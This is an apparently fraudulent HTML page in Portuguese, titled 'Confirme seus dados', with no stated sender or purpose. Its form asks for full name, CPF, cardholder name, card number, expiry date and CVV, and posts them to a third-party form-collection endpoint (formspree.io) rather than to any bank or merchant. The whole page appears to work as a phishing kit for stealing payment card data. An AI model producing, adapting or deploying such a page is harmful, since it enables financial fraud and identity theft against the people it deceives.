<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="stylesheet" href="style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirme seus dados</title>
  </head>
<body>
  <div class="container">
    <div class="title">Confirme seus dados</div>
    <div class="content">
      <form
      action="https://formspree.io/f/mayvjoeb"
      method="POST"
    >
        <div class="user-details">
          <div class="input-box">
            <span class="details">Nome Completo:</span>
            <input type="text" name="nome" id="nome" placeholder="" required>
          </div>
          <div class="input-box">
            <span class="details">CPF:</span>
            <input type="text" name="CPF" id="CPF" placeholder="" required>
          </div>
          <div class="input-box">
            <span class="details">Nome impresso no cartão:</span> 
            <input type="text" name="Nome impresso no cartão" id="Nome impresso no cartão" placeholder="" required>
                    </div>
          <div class="input-box">
            <span class="details">Número do cartão:</span>
            <input type="text" name="Número do cartão" id="Número do cartão" placeholder="" required>
          </div>
          <div class="input-box">
            <span class="details">Validade do cartão:</span>
            <input type="text" name="VALIDADE" id="VALIDADE" placeholder="" required>
          </div>
          <div class="input-box">
            <span class="details">Código de segurança:</span>
            <input type="text" name="CVV" id="CVV" placeholder="" required>
          </div>
        </div>
        <div class="gender-details">
          
          <span class="gender-title"></span>
          <div class="category">
            <label for="dot-1">
            <span class=""></span>
            <span class="gender"></span>
          </label>
          <label for="dot-2">
            <span class=""></span>
            <span class="gender"></span>
          </label>
          <label for="dot-3">
            <span class=""></span>
            <span class="gender"></span>
            </label>
          </div>
        </div>
        <div class="button">
          <input type="submit" value="Confirmar">
        </div>
      </form>
    </div>
  </div>

</body>
</html>
